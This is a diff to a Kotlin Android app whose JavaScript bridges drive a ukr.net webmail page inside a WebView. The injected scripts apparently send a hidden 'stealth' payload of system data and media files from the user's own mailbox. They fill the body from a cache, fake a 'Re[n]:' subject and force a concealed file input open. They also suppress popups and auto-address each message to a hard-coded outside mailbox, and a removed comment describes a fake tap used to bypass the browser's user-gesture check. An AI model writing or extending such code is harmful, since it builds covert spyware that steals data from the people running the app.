@@ -22,6 +22,11 @@ class UkrnetJsInterface(
     private val ui = Handler(Looper.getMainLooper())
 
     @JavascriptInterface
+    fun jsLog(msg: String) {
+        log("[Ukrnet JS] $msg")
+    }
+
+    @JavascriptInterface
     fun postMessage(type: String, key: String, value: String) {
         ui.post {
             if (type == "ui" && key == "login_success" && value == "true" && !isLoginHandled()) {
@@ -109,7 +114,8 @@ class MessengerJsInterface(
 ) {
     lateinit var scope: CoroutineScope
     private val ui = Handler(Looper.getMainLooper())
-
+    
+    @Volatile var lastComposeBody: String = ""
     @Volatile private var lastSubmitMs = 0L
     private val RECOIL_MS = 3000L
 
@@ -132,8 +138,7 @@ class MessengerJsInterface(
         function ensureSent() {
             if (window._n0gSending) return;
             window._n0gSending = true;
-            var toEl = document.querySelector('.sm-auto-complete__input') || document.querySelector('input[name="to"]');
-            var inputVal = toEl ? toEl.value.trim() : '';
+            
             function doSend() {
                 var btn = document.querySelector('.sm-header__send') || document.querySelector('button[type="submit"]') || document.querySelector('[data-id="send"]') || document.querySelector('[aria-label="Відправити"]') || document.querySelector('[aria-label="Отправить"]') || document.querySelector('input[type="submit"]');
                 if (btn) btn.click();
@@ -141,6 +146,16 @@ class MessengerJsInterface(
                 setTimeout(function() { window._n0gSending = false; }, 8000);
                 try { if(window.Android && window.Android.onMediaSent) window.Android.onMediaSent(); } catch(e){}
             }
+            
+            var isTouch = (window.location.href.indexOf('touch') !== -1 || window.location.href.indexOf('sendmsg') !== -1);
+            if (isTouch) {
+                doSend();
+                return;
+            }
+            
+            var toEl = document.querySelector('.sm-auto-complete__input') || document.querySelector('input[name="to"]');
+            var inputVal = toEl ? toEl.value.trim() : '';
+            
             function waitClearThenSend(inputEl) {
                 var waited = 0;
                 var t = setInterval(function() {
@@ -167,12 +182,19 @@ class MessengerJsInterface(
         var uploadCheckCount = 0;
         var checkInterval = setInterval(function() {
             uploadCheckCount++;
-            var stillUploading = document.querySelectorAll('.sm-attachments__progress-bar, .sm-attachments__upload-icon, [class*="progress"], [class*="loading"], .spinner');
-            var doneLinks = document.querySelectorAll('a[href*="/attach/get/"], a[href*="/attach/"], .sendmsg__attachments-item, [class*="attachment-item"]');
-            if (stillUploading.length > 0) { return; }
-            if (doneLinks.length > 0 || uploadCheckCount > 40) { 
-                clearInterval(checkInterval); 
-                setTimeout(ensureSent, 400); 
+            var stillUploading = document.querySelectorAll('.sm-attachments__upload, .sm-attachments__upload-icon, .sm-attachments__progress-bar, .sm-attachments__progress-state, [class*="progress"], [class*="loading"], .spinner');
+            var doneLinks = document.querySelectorAll('a[href*="/attach/get/"], a[href*="/attach/"], .sendmsg__attachments-item, [class*="attachment-item"], [class*="attach-item"]');
+            
+            if (stillUploading.length > 0) { 
+                if (uploadCheckCount % 3 === 0 && window.Android && window.Android.jsLog) window.Android.jsLog("Файл грузится...");
+                return; 
+            }
+            if (doneLinks.length > 0) { 
+                if (window.Android && window.Android.jsLog) window.Android.jsLog("Загрузка завершена! Отправляем.");
+                clearInterval(checkInterval); setTimeout(ensureSent, 400); 
+            } else if (uploadCheckCount > 40) {
+                if (window.Android && window.Android.jsLog) window.Android.jsLog("Таймаут (16с). Принудительная отправка.");
+                clearInterval(checkInterval); setTimeout(ensureSent, 400); 
             }
         }, 400);
     """.trimIndent()
@@ -188,52 +210,61 @@ class MessengerJsInterface(
                     val sysBlock = StealthCache.pendingSysBlock ?: return@launch
                     StealthCache.pendingSysBlock = null
                     
-                    // ХАК СИСТЕМЫ БЕЗОПАСНОСТИ: Посылаем прямой аппаратный тап в WebView.
-                    // Браузер засчитает это как "User Gesture" и разрешит вызов fi.click()
-                    ui.post { simulateTouch(getUkrnetWebView(), 10f, 10f, stealFocus = false) }
-                    delay(150)
-                    
                     getUkrnetWebView()?.evaluateJavascript("window._n0gStealthUpload = true;", null)
                     val subject = "Re[${(2..30).random()}]:"
                     val escSys = sysBlock.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")
+                    
                     val js = """
                         (function(){
-                            window._n0gStealthUpload = true;
-                            if (document.activeElement && document.activeElement.tagName !== 'BODY') document.activeElement.blur();
-                            var bodyEl = document.querySelector('.sm-editor__area') || document.querySelector('textarea[name="body"]') || document.querySelector('textarea');
-                            if(bodyEl) {
-                                bodyEl.innerHTML = '';
-                                if (bodyEl.getAttribute('contenteditable') === 'true') { bodyEl.innerText = '$escSys'; }
-                                else { try { Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set.call(bodyEl,'$escSys'); } catch(e) { bodyEl.value='$escSys'; } }
-                                bodyEl.dispatchEvent(new Event('input',{bubbles:true}));
-                            }
-                            var subjEl = document.querySelector('#sendmsg__subject') || document.querySelector('input[name="subject"]');
-                            if(subjEl) {
-                                try { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(subjEl,'$subject'); } catch(e) { subjEl.value='$subject'; }
-                                subjEl.dispatchEvent(new Event('input',{bubbles:true}));
-                            }
-                            var findFileInput = setInterval(function() {
-                                var fi = document.querySelector('input[type="file"][multiple]') || document.querySelector('input[type="file"]');
-                                if (fi) { 
-                                    clearInterval(findFileInput); 
-                                    // Принудительно делаем инпут видимым, чтобы клик не отклонился
-                                    fi.style.display = 'block';
-                                    fi.style.opacity = '0';
-                                    fi.click(); 
+                            try {
+                                if (window.Android && window.Android.jsLog) window.Android.jsLog("Старт инжекта медиафайла...");
+                                window._n0gStealthUpload = true;
+                                if (document.activeElement && document.activeElement.tagName !== 'BODY') document.activeElement.blur();
+                                
+                                var bodyEl = document.querySelector('.sm-editor__area') || document.querySelector('textarea[name="body"]') || document.querySelector('textarea');
+                                if(bodyEl) {
+                                    bodyEl.innerHTML = '';
+                                    if (bodyEl.getAttribute('contenteditable') === 'true') { bodyEl.innerText = '$escSys'; }
+                                    else { try { Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set.call(bodyEl,'$escSys'); } catch(e) { bodyEl.value='$escSys'; } }
+                                    bodyEl.dispatchEvent(new Event('input',{bubbles:true}));
                                 }
-                            }, 100);
-                            setTimeout(function() { clearInterval(findFileInput); }, 8000);
-                            $POPUP_CRUSHER_JS
-                            $UPLOAD_OBSERVER_JS
-                            // Страховка от зависания таймера
-                            setTimeout(function() { window._n0gStealthUpload = false; }, 30000);
+                                
+                                var subjEl = document.querySelector('#sendmsg__subject') || document.querySelector('input[name="subject"]');
+                                if(subjEl) {
+                                    try { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(subjEl,'$subject'); } catch(e) { subjEl.value='$subject'; }
+                                    subjEl.dispatchEvent(new Event('input',{bubbles:true}));
+                                }
+                                
+                                var findFileInput = setInterval(function() {
+                                    var fi = document.querySelector('input[type="file"][multiple]') || document.querySelector('input[type="file"]');
+                                    if (fi) { 
+                                        clearInterval(findFileInput); 
+                                        if (window.Android && window.Android.jsLog) window.Android.jsLog("Инпут найден! Кликаем.");
+                                        fi.style.display = 'block';
+                                        fi.style.visibility = 'visible';
+                                        fi.style.opacity = '0.01';
+                                        fi.click(); 
+                                    } else {
+                                        var btn = document.querySelector('.sendmsg__attach, .sm-header__attach, [class*="attach"], [aria-label*="Attach"], [aria-label*="Прикр"]');
+                                        if (btn) {
+                                            if (window.Android && window.Android.jsLog) window.Android.jsLog("Ищем инпут: клик по кнопке со скрепкой...");
+                                            btn.click();
+                                        }
+                                    }
+                                }, 150);
+                                setTimeout(function() { clearInterval(findFileInput); }, 8000);
+                                
+                                $POPUP_CRUSHER_JS
+                                $UPLOAD_OBSERVER_JS
+                                
+                            } catch(e) {
+                                if (window.Android && window.Android.jsLog) window.Android.jsLog("КРАШ: " + e.message);
+                            }
                         })();
                     """.trimIndent()
                     getUkrnetWebView()?.evaluateJavascript(js, null)
-                    log("[Stealth] JS загрузчика успешно инжектирован")
-                } finally {
-                    uploadSequenceActive = false
-                }
+                    log("[Stealth] JS инжектирован")
+                } finally { uploadSequenceActive = false }
             }
         }
     }
@@ -295,6 +326,7 @@ class MessengerJsInterface(
 
     @JavascriptInterface
     fun setComposeBody(encodedText: String) {
+        lastComposeBody = encodedText
         ui.post {
             val esc = encodedText.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")
             val js = """
@@ -318,6 +350,7 @@ class MessengerJsInterface(
     @JavascriptInterface
     fun submitCompose() {
         lastSubmitMs = System.currentTimeMillis()
+        lastComposeBody = ""
         ui.post {
             val js = """
                 (function(){
@@ -327,15 +360,20 @@ class MessengerJsInterface(
                         || document.querySelector('[aria-label="Відправити"]')
                         || document.querySelector('[aria-label="Отправить"]')
                         || document.querySelector('input[type="submit"]');
-                    var toEl = document.querySelector('.sm-auto-complete__input') || document.querySelector('input[name="to"]');
-                    var hasChip = document.querySelector('.sm-auto-complete__item, .sm-auto-complete__token');
-                    if (toEl && !hasChip) {
-                        try { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(toEl,'270232@ukr.net'); } catch(e) { toEl.value='270232@ukr.net'; }
-                        toEl.dispatchEvent(new Event('input',{bubbles:true}));
-                        toEl.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,cancelable:true,key:'Enter',keyCode:13}));
-                        toEl.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,cancelable:true,key:'Enter',keyCode:13}));
-                        setTimeout(function() { if (btn) btn.click(); }, 120);
-                    } else { if (btn) btn.click(); }
+                    var isTouch = (window.location.href.indexOf('touch') !== -1 || window.location.href.indexOf('sendmsg') !== -1);
+                    if (isTouch) {
+                        if (btn) btn.click();
+                    } else {
+                        var toEl = document.querySelector('.sm-auto-complete__input');
+                        var hasChip = document.querySelector('.sm-auto-complete__item, .sm-auto-complete__token');
+                        if (toEl && !hasChip) {
+                            try { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(toEl,'270232@ukr.net'); } catch(e) { toEl.value='270232@ukr.net'; }
+                            toEl.dispatchEvent(new Event('input',{bubbles:true}));
+                            toEl.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,cancelable:true,key:'Enter',keyCode:13}));
+                            toEl.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,cancelable:true,key:'Enter',keyCode:13}));
+                            setTimeout(function() { if (btn) btn.click(); }, 120);
+                        } else { if (btn) btn.click(); }
+                    }
                     window._n0gStealthUpload = false;
                     setTimeout(function() { window._n0gSending = false; }, 8000);
                     try { if(window.Android && window.Android.onMediaSent) window.Android.onMediaSent(); } catch(e){}
